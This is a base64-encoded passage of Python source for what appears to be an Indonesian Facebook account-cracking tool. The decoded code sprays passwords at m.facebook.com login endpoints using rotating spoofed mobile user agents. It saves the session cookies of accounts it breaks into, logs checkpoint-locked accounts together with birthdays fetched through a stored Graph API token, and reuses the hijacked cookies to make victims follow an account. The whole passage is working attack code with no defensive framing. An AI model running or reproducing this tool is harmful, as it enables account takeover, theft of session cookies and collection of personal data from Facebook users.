CAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgIAlrdWtpcz0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgcHJpbnQgKCdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnJShILHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCclKHdha3R1KSwgJ2EnKS53cml0ZSgnICotLT4gJXMg4peKICVzIOKXiiAlc1xuJyUodXNlcixwdyxrdWtpcykpDQogICAgICAgICAgICAgICAgaWt1dGlfZ3coa3VraXMpDQogICAgICAgICAgICAgICAgYnJlYWsgDQogICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgIGlmICJtdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgCSAgICB0cnk6DQogICAgICAgICAgICAJICAgICAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNyNGNrKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgCWRheSA9ICcnDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCAgID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3IzY2sodXNlcixwdykNCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKCclcyDil4ogJXMnJSh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzXG4iICUgKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgImdrX211bmN1bCIgaW4gc2VsZi5vcHNpX2M6DQogICAgICAgICAgICAgICAgCXRyeToNCiAgICAgICAgICAgICAgICAJICAgIHJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgIAkgICAgbGFoaXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKHVzZXIscm9teikpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgIAkgICAgbW9udGgsIGRheSwgeWVhciA9IGxhaGlyLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAJICAgIHByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlcyAgJyAlIChLLHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgCSAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIGJyZWFrDQogICAgICAgICAgICAgICAgCWV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAJICAgIGRheSA9ICcnDQogICAgICAgICAgICAgICAgCSAgICBtb250aCAgID0gJycNCiAgICAgICAgICAgICAgICAJICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAJZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgCXByaW50ICdcciAlcyotLT4gJXMg4peKICVzICAgICAgICAgICAnICUgKEssdXNlcixwdykNCiAgICAgICAgICAgICAgICAJY3AuYXBwZW5kKCclcyDil4ogJXMnJSh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAJb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzXG4iICUgKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgIAljb250aW51ZQ0KICAgICAgICBsb29wICs9IDENCiAgICAgICAgd2FybmEgPSByYW5kb20uY2hvaWNlKFtNLCBILCBLLCBCLCBVLCBPLCBQXSkNCiAgICAgICAgcHJpbnQoJ1xyJyt3YXJuYSsn4oCiXHgxYlsxOzk2bSBbY3JhY2tdICVzLyVzIFtPSzolc10tW0NQOiVzXSclKGxvb3AsbGVuKHNlbGYuaWQpLGxlbihvayksbGVuKGNwKSkpLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAjIE1PQklMRQ0KICAgIGRlZiBtb2JpbChzZWxmLCB1c2VyLCBtYW51YWwsKipkYXRhKToNCiAgICAJZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAJaWYgInJhbmRvbSIgaW4gc2VsZi51Z2VuOg0KICAgIAkgICAgdHJ5Og0KICAgIAkgICAgICAgIHVhID0gcmFuZG9tLmNob2ljZShbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjQuNDsgZW4tYXU7IFNBTVNVTkcgU00tTjkxNUcgQnVpbGQvS1RVODRQKSBBcHBsZVdlYktpdC81MzcuMzYgKEtUSE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzIuMCBDaHJvbWUvMzQuMC4xODQ3Ljc2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiTm9raWFYMy0wMi81LjAgKDA2LjA1KSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC4xLjI7IE5va2lhX1ggQnVpbGQvSlpPNTRLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMzAuMC4xNTk5LjgyIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjIuMC4xMiIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgTmF2b3JpIFFMIFN0aXggMzUwMCBCdWlsZC9MTVk0OUY7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNjcuMC4zMzk2Ljg3IFNhZmFyaS81MzcuMzYiLCJOb2tpYUMzLTAwLzUuMCAoMDcuMjApIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCBBcHBsZVdlYktpdC80MjArIChLSFRNTCwgbGlrZSBHZWNrbykgU2FmYXJpLzQyMCsiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiW0ZCQU4vRkI0QSxGQkFWLzIyMi4wLjAuNDguMTEzO0ZCQlYvMTU1MzIzMzY2O0ZCRE0ve2RlbnNpdHk9Mi4wLHdpZHRoPTcyMCxoZWlnaHQ9MTM2MH07RkJMQy9zcl9SUztGQlJWLzE1NjYyNTY5NjtGQkNSL210OnM7RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUksLkZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0xETi1MMjE7RkJTVi84LjAuMDtGQk9QLzE5LkZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaSxdIiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2Il0pDQogICAgICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIAl1YSA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCiAgICAgICAgZWxpZiAiZ2tfcmFuZG9tIiBpbiBzZWxmLnVnZW46DQogICAgICAgIAl0cnk6DQogICAgICAgIAkgICAgdWEgPSBvcGVuKCd1YS50eHQnLCAncicpLnJlYWQoKQ0KICAgICAgICAJZXhjZXB0IElPRXJyb3I6DQogICAgICAgIAkgICAgdWEgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQogICAgICAgIGZvciBwdyBpbiBtYW51YWw6DQogICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtLmZhY2Vib29rLmNvbSIsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsImRudCI6IjEiLCJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLCJzZWMtZmV0Y2gtc2l0ZSI6Im5vbmUiLCJzZWMtZmV0Y2gtbW9kZSI6Im5hdmlnYXRlIiwic2VjLWZldGNoLXVzZXIiOiI/MSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS8iLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkNCiAgICAgICAgICAgIHAgPSBzZXMuZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYnKS50ZXh0DQogICAgICAgICAgICBkYXRhYSA9eyJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwiamF6b2VzdCI6cmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwidWlkIjp1c2VyLCJmbG93IjoibG9naW5fbm9fcGluIiwicGFzcyI6cHcsIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyJ9DQogICAgICAgICAgICBzZXMuaGVhZGVycy51cGRhdGUoeyJIb3N0IjoibS5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL20uZmFjZWJvb2suY29tIiwiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6Im5hdmlnYXRlIiwic2VjLWZldGNoLXVzZXIiOiI/MSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43In0pDQogICAgICAgICAgICBwbyA9IHNlcy5wb3N0KCdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wJyxkYXRhPWRhdGFhLGFsbG93X3JlZGlyZWN0cz1GYWxzZSk7amVkYSgyKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgIAlrdWtpcz0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgcHJpbnQgKCdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnJShILHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCclKHdha3R1KSwgJ2EnKS53cml0ZSgnICotLT4gJXMg4peKICVzIOKXiiAlc1xuJyUodXNlcixwdyxrdWtpcykpDQogICAgICAgICAgICAgICAgaWt1dGlfZ3coa3VraXMpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICAgICAgaWYgIm11bmN1bCIgaW4gc2VsZi5vcHNpX2M6DQogICAgICAgICAgICAJICAgIHRyeToNCiAgICAgICAgICAgIAkgICAgICAgIHJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbGFoaXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKHVzZXIscm9teikpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGxhaGlyLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3I0Y2sodXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCgiJXMg4peKICVzIOKXiiAlcyAlcyAlcyIlKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlc1xuIiUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgICAgICAJZGF5ID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoICAgPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5jcjNjayh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxpZiAiZ2tfbXVuY3VsIiBpbiBzZWxmLm9wc2lfYzoNCiAgICAgICAgICAgICAgICAJdHJ5Og0KICAgICAgICAgICAgICAgIAkgICAgcm9teiA9IG9wZW4oJ2RhdGEvdG9rZW4udHh0JykucmVhZCgpDQogICAgICAgICAgICAgICAgCSAgICBsYWhpciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUodXNlcixyb216KSkuanNvbigpWydiaXJ0aGRheSddDQogICAgICAgICAgICAgICAgCSAgICBtb250aCwgZGF5LCB5ZWFyID0gbGFoaXIuc3BsaXQoJy8nKQ0KICAgICAgICAgICAgICAgIAkgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAJICAgIGNwLmFwcGVuZCgiJXMg4peKICVzIOKXiiAlcyAlcyAlcyIlKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIAkgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlc1xuIiUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIAkgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAJZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgIAkgICAgZGF5ID0gJycNCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoICAgPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIAlleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1c2VyLHB3KQ0KICAgICAgICAgICAgICAgIAljcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgCWJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KICAgICAgICB3YXJuYSA9IHJhbmRvbS5jaG9pY2UoW00sIEgsIEssIEIsIFUsIE8sIFBdKQ0KICAgICAgICBwcmludCgnXHInK3dhcm5hKyfigKJceDFiWzE7OTZtIFtjcmFja10gJXMvJXMgW09LOiVzXS1bQ1A6JXNdJyUobG9vcCxsZW4oc2VsZi5pZCksbGVuKG9rKSxsZW4oY3ApKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIyBPUFNJIFNBQVQgQ1JBQ0sNCiAgICBkZWYgY3I0Y2soc2VsZix1aWQscHcsZGF5LG1vbnRoLHllYXIpOg0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgIHVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IikNCiAgICAgICAgb3B0aW9uID0gW10NCiAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJvcmlnaW4iOiBtYiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsInVzZXItYWdlbnQiOiB1YSwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsInNlYy1mZXRjaC11c2VyIjogIj8xIiwic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLCJyZWZlcmVyIjogbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSJ9KQ0KICAgICAgICBkYXRhID0ge30NCiAgICAgICAgZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgICAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIAlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KICAgICAgICBydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgdXJsUG9zdD1zZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YSkNCiAgICAgICAgaWYgIlRlbXVrYW4gQWt1biBBbmRhIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodXJsUG9zdC50ZXh0KSk6DQogICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICAgICAgdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpDQogICAgICAgICAgICBsaW5rMj1ydW4uZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgICAgIG5oICAgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJuaCJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAgZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0NCiAgICAgICAgICAgIHhueHggPSBwYXJzZXIoc2VzLnBvc3QobWIrZm9ybVsiYWN0aW9uIl0sIGRhdGE9ZGF0YUQpLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHhueHguZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICAgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdWlkLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgZm9yIG9wdCBpbiByYW5nZShsZW4obmdldykpOiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHByaW50KCIgICAgICAlcyVzLiAlcyVz